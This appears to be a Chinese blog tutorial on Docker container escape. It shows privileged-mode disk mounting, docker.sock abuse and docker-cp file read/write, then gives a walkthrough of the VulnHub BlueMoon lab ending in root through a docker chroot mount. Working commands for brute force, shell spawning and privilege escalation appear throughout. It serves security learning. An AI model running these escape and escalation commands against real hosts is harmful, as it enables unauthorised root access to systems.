## **Docker逃逸**

###  **什么是Docker**

Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的
Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。正因为docker属于沙箱机制，所以当获得docker容器的权限时与获得宿主机权限是两个概念。

###  **Docker逃逸**

> 配置不当引起的docker逃逸
>
> docket remote api未授权访问导致逃逸

特权模式逃逸

挂载敏感目录

> 内核漏洞提权实现逃逸（针对Linux内核利于dirtycow、dirtypipe等）
>
> Docker本身漏洞（CVE）
>

>> CVE-2019-5736

>>

>> CVE-2019-14271

这里主要测试挂载卷造成的逃逸，

#####  **挂载敏感目录逃逸之特权模式挂载逃逸**

实验环境：ubuntu16.04 ，docker 版本 20.10

![image-20220330195714493.png](https://image.3001.net/images/20220426/1650957126_62679b46d6a0a8c86f4a4.png!small)

> service docker status

![image-20220330195801259.png](https://image.3001.net/images/20220426/1650957127_62679b47604f662f5e194.png!small)

docker的状态是开启的，未安装docker需要安装。

特权模式下启动一个容器。

> docker run -it --privileged ff6f /bin/bash

![image-20220330195929458.png](https://image.3001.net/images/20220426/1650957127_62679b47db132b35ef92e.png!small)

查看docker容器磁盘文件。

> fdisk -l

![image-20220330200023942.png](https://image.3001.net/images/20220426/1650957128_62679b486ee14feed84a1.png!small)

正常环境安装的时候也都会创建磁盘文件，所以这些目录下会有很多文件。

> ls /dev

![image-20220330200309713.png](https://image.3001.net/images/20220426/1650957129_62679b490e556ea899f85.png!small)

创建一个目录名为"test"，名字任意创建。

> mkdir test

此时`test`目录下无任何文件,将`/dev/sda1`挂载在test目录下。

> mount /dev/sda1 /test

查询`test`目录。

![image-20220330200654233.png](https://image.3001.net/images/20220426/1650957129_62679b4994bd7c3c108e1.png!small)

此时例如`home`等目录下是没有任何文件的。

![image-20220330200828481.png](https://image.3001.net/images/20220426/1650957130_62679b4a10c6e1325e1b8.png!small)

将`amazing`写入`/test/home/1.txt`

> echo "amazing" >/test/home/1.txt

此时宿主机`home`，目录下是存在1.txt文件的。

![image-20220330201310772.png](https://image.3001.net/images/20220426/1650957130_62679b4a88660e3e8b419.png!small)

##### 挂载敏感目录逃逸之docker.sock 挂载

Docker架构相当于C/S架构，docker.sock就是docker中套docker，docker的client和server的通信模式参考。

> <https://www.jb51.net/article/99019.htm>

因为确实找不到什么比较官方或者正式的介绍，华为云的介绍只是介绍了网络通信模式。

socket的连接方式有三种

    
    
    unix:///var/run/docker.sock  
    tcp://host:port  
    fd://socketfd

利用docker.sock逃逸的前提条件

>   * 攻击者获得了 docker 容器的访问权限
>
>   * 容器已安装`/var/run/docker.sock`
>
>

使用挂载实现`docker.sock`,拉取一个镜像ubuntu16.04

> docker pull ubuntu:16.04

![image-20220330221646544.png](https://image.3001.net/images/20220426/1650957131_62679b4b1884ff9b248f2.png!small)

查看镜像

> docker images

![image-20220330221737120.png](https://image.3001.net/images/20220426/1650957131_62679b4bb7c29f56187af.png!small)

运行一个挂载/var/run/的容器

> docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock
> ubuntu:16.04 /bin/bash

进入docker容器内

> apt-get install docker.io

这个时候安装可能报错

![image-20220330221950971.png](https://image.3001.net/images/20220426/1650957132_62679b4c6e9fd06abbd1f.png!small)

更新源

> apt update

![image-20220330222036687.png](https://image.3001.net/images/20220426/1650957133_62679b4d1102e736e4aa1.png!small)

更新源之后重新安装docker，因为拉取的ubuntu内未安装docker或者可能是docker版本过老。

> apt-get install docker.io

![image-20220330222429880.png](https://image.3001.net/images/20220426/1650957133_62679b4db520625426d80.png!small)

查看宿主机信息。

> docker -H unix://var/run/docker.sock info

![image-20220330222832939.png](https://image.3001.net/images/20220426/1650957134_62679b4e997c10a5425b5.png!small)

利用docker.sock再创建一个docker容器，挂载`/var/run`

> docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04
> /bin/bash

![image-20220330222948236.png](https://image.3001.net/images/20220426/1650957135_62679b4f4b867c6c8e8db.png!small)

此时查看`test`目录下可看到宿主机文件文件。

![image-20220330223102070.png](https://image.3001.net/images/20220426/1650957135_62679b4fcc8f291d988fa.png!small)

实现逃逸。这里本来打算使用alpine镜像，这里说说什么是alpine镜像。

    
    
    alpine(https://www.alpinelinux.org/)是一个官方推荐的基础镜像，大小5MB，相对于ubuntu的大小来说下载方便，但是拉取ubuntu镜像也比较方便。

但是`alpine`在更新`apk`的时候，比较慢。

![image-20220330224040897.png](https://image.3001.net/images/20220426/1650957136_62679b506fe1f4e50b892.png!small)

所以还是建议使用ubuntu，这里可以利用docker逃逸去复制宿主机的`source.list`更换源，可能会快一点。

#### 原理

过程可分为两部分

 **文件写入**

将数据写入文件，它可用于执行特权写入或在受限文件系统之外写入文件，通过将文件复制到临时容器并返回到主机上的目标位置来写入文件。

    
    
    CONTAINER_ID="$(docker run -d alpine)" # or existing  
    TF=$(mktemp)  
    echo "DATA" > $TF  
    docker cp $TF $CONTAINER_ID:$TF  
    docker cp $CONTAINER_ID:$TF file_to_write

 **文件读取**

它从文件中读取数据，它可用于进行特权读取或在受限文件系统之外公开文件，通过将文件复制到临时容器并返回到主机上的新位置来读取文件。

    
    
    CONTAINER_ID="$(docker run -d alpine)"  # or existing  
    TF=$(mktemp)  
    docker cp file_to_read $CONTAINER_ID:$TF  
    docker cp $CONTAINER_ID:$TF $TF  
    cat $TF

二进制文件设置了 SUID 位，会被滥用来访问文件系统、升级或维护特权访问作为 SUID 后门，上面那个复现过程实现了创建二进制文件的本地 SUID
副本并运行它以维护提升的权限，要与现有的 SUID
二进制文件交互，请跳过第一个命令并使用其原始路径运行程序，其最终结果是在容器B中实现了对宿主机权限的控制。

####  **BlueMoon简介**

>   *  **Name** : BlueMoon: 2021
>
>   *  **Date release** : 7 Apr 2021
>
>   *  **Author** : Kirthik
>
>   *  **Series** : BlueMoon
>
>

#### 环境搭建

攻击机`kali`

`IP`192.168.158.39

目标靶机`Debian`,ip地址未知，dhcp自动获取

下载地址

> <https://download.vulnhub.com/bluemoon/bluemoon.ova>

导入虚拟机，官网描述是使用vb，但是vmware可以导入，然而出现问题获取不到网卡

![image-20220329111228640.png](https://image.3001.net/images/20220426/1650957136_62679b50ee927c0274f02.png!small)

#### 信息搜集

> netdiscover -n 192.168.248.39/24

![image-20220329144101188.png](https://image.3001.net/images/20220426/1650957137_62679b51b97eb7859d139.png!small)

我使用搞得热点比较容易确定目标靶机，扫描端口

> nmap -A -p- 192.168.158.250

![image-20220329144239633.png](https://image.3001.net/images/20220426/1650957138_62679b52a31d2c1f01bf9.png!small)

开放三个端口21，22以及80

![image-20220329144006550.png](https://image.3001.net/images/20220426/1650957139_62679b53937897f5c592f.png!small)

扫描目录，指纹识别，既然是靶场要考虑到21端口是不是匿名用户或者22和21端口是否能爆破，直接对21和22端口爆破并未有结果，也可能是字典的问题，但是换了几个字典确实没用，扫描目录使用`dirsearch`扫描目录，内置字典并不能扫描出结果，换字典。

> python3 dirsearch.py -u "[http://192.168.158.250](http://192.168.158.250/)"
> -e *

![image-20220329150711058.png](https://image.3001.net/images/20220426/1650957142_62679b56a4a42e7e0e5d4.png!small)

![image-20220329150725960.png](https://image.3001.net/images/20220426/1650957143_62679b5767f926bbbaaab.png!small)

访问是个二维码,扫描的内容。

> #!/bin/bash HOST=ip USER=userftp PASSWORD=ftpp@ssword ftp -inv $HOST user
> $USER $PASSWORD bye EOF

#### 获取flag

ftp的账号密码

> userftp/ftpp@ssword

工具连接或者命令行都可

![image-20220329151036922.png](https://image.3001.net/images/20220426/1650957143_62679b57e4c960c4e2d7a.png!small)

![image-20220329151338244.png](https://image.3001.net/images/20220426/1650957144_62679b5877d4ff18f157d.png!small)

在`information.txt`中告诉了，`p_list.txt`为密码字典，用户名为`robin`,

![image-20220329151425938.png](https://image.3001.net/images/20220426/1650957144_62679b58e46c27df0d961.png!small)

上级目录中有`jerry`中有个用户名的txt，但是无法查看文件，使用robin用户爆破

![image-20220329155821125.png](https://image.3001.net/images/20220426/1650957145_62679b59751617f331a4c.png!small)

账号密码

> robin/k4rv3ndh4nh4ck3r

ssh登录

> ssh robin@192.168.158.250
>
> ls
>
> cat user1.txt

![image-20220329160010391.png](https://image.3001.net/images/20220426/1650957146_62679b5a5a0bee7ffbf76.png!small)

使用命令

> sudo -l

![image-20220329160548808.png](https://image.3001.net/images/20220426/1650957147_62679b5bbdbdbf7a69d30.png!small)

告诉了`jerry`权限可以执行`/home/robin/project/feedback.sh`

#### 横向提权

> sudo -u jerry /home/robin/project/feedback.sh
>
> jerry
>
> /bin/sh

![image-20220329160839861.png](https://image.3001.net/images/20220426/1650957148_62679b5c80e8fcd0b0249.png!small)

当前用户为`jerry`,这个时候我们就可以读取前面不能读取的`user2.txt`，因为这个时候在`home/robin`,所以切换用户目录读取或者直接读取文件。

![image-20220329161056383.png](https://image.3001.net/images/20220426/1650957149_62679b5d425ca57e92cd3.png!small)

#### 垂直提权

给出提示使用find继续提权到root，所以这里应该的考点就是suid提权了，因为不是交互式的shell使用起来不方便，所以使用python获取交互式shell。

> python -c 'import pty;pty.spawn("/bin/bash")'

![image-20220329161530154.png](https://image.3001.net/images/20220426/1650957150_62679b5e1645b82d2d01c.png!small)

查询是否有suid权限的文件

> find / -perm -u=s -type f 2>/dev/null

![image-20220329161656321.png](https://image.3001.net/images/20220426/1650957150_62679b5eabe11e63abadc.png!small)

> find /usr/bin/passwd -exec "/bin/sh" \;

![image-20220329162426360.png](https://image.3001.net/images/20220426/1650957151_62679b5f9f9798480f191.png!small)

无果，，，，纳闷儿了

> docker images
>
> docker ps

![image-20220329163015078.png](https://image.3001.net/images/20220426/1650957152_62679b60765cac8298ccd.png!small)

镜像没起起来，搜索一下才知道这里需要使用镜像挂载来进行提权。

> docker run -v /:/mnt --rm -it alpine chroot /mnt sh

![image-20220329163552186.png](https://image.3001.net/images/20220426/1650957153_62679b6145c82d9a7f6dc.png!small)

此时已经为`root`权限，读取根目录下的`root.txt`

![image-20220329163645322.png](https://image.3001.net/images/20220426/1650957154_62679b6216e58e44e2e5b.png!small)

##  **结语**

这个靶机有点儿不怎么有好的地方在于对于字典的要求比较高，难点在于使用镜像挂载提权，这里可参考文章应该是讲镜像挂载原理比较清晰的文章吧。

